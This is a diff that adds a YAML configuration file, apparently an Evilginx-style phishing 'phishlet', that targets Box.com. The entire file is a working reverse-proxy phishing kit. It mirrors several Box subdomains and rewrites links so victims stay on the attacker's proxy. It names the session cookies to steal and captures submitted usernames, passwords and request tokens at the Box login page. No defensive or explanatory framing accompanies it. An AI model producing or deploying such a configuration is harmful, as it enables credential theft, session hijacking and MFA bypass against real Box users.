@@ -1,0 +1,52 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'box.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'box.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'box.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn01', orig_sub: 'cdn01', domain: 'boxcdn.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'box.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'box.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'public', orig_sub: 'public', domain: 'boxcloud.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '2.realtime.services', orig_sub: '2.realtime.services', domain: 'box.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pendo-data-prod', orig_sub: 'pendo-data-prod', domain: 'box.net', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'box.com', orig_sub: 'box', domain: 'box.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: 'account.box.com', orig_sub: 'account', domain: 'box.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: 'cdn01.boxcdn.net', orig_sub: 'cdn01', domain: 'boxcdn.net', search: 'href="https://{hostname}', replace: '', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: 'api.box.com', orig_sub: 'box', domain: 'box.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: 'app.box.com', orig_sub: 'box', domain: 'box.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: 'public.boxcloud.com', orig_sub: 'boxcloud', domain: 'boxcloud.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+  - {triggers_on: '2.realtime.services.box.net', orig_sub: 'box', domain: 'box.net', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/json,text/plain,text/javascript,text/javascript,image/gif,image/png,image/svg+xml,image/avif,image/webp,image/apng']}
+
+auth_tokens:
+  - domain: '.box.com'
+    keys: ['csrf-token','box-tools-use-ie-fallback','bgp-6fee2b29','BoxEdit-bgp-id','box-edit-secret-cookie-name','_splunk_rum_sid','dc38854437204','box_active_user_subdomain','partial_id','z','cn','bv','box_active_identity','uid,box_locale','s_sq','AMCV_B9B28F7954BD76240A4C98BC%40AdobeOrg','site_preference','box_visitor_id','259b-d7c1','_ga_15GQDK80BL','_ga','intercom-device-id-p5dki4sl','_gcl_au']
+    type: 'cookie'
+  - domain: '.app.box.com'
+    keys: ['csrf-token','box-tools-use-ie-fallback','bgp-6fee2b29','BoxEdit-bgp-id','box-edit-secret-cookie-name','_splunk_rum_sid','dc38854437204','box_active_user_subdomain','partial_id','z','cn','bv','box_active_identity','uid,box_locale','s_sq','AMCV_B9B28F7954BD76240A4C98BC%40AdobeOrg','site_preference','box_visitor_id','259b-d7c1','_ga_15GQDK80BL','_ga','intercom-device-id-p5dki4sl','_gcl_au']
+    type: 'cookie'
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'request_token'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'account.box.com'
+  path: '/login'
+
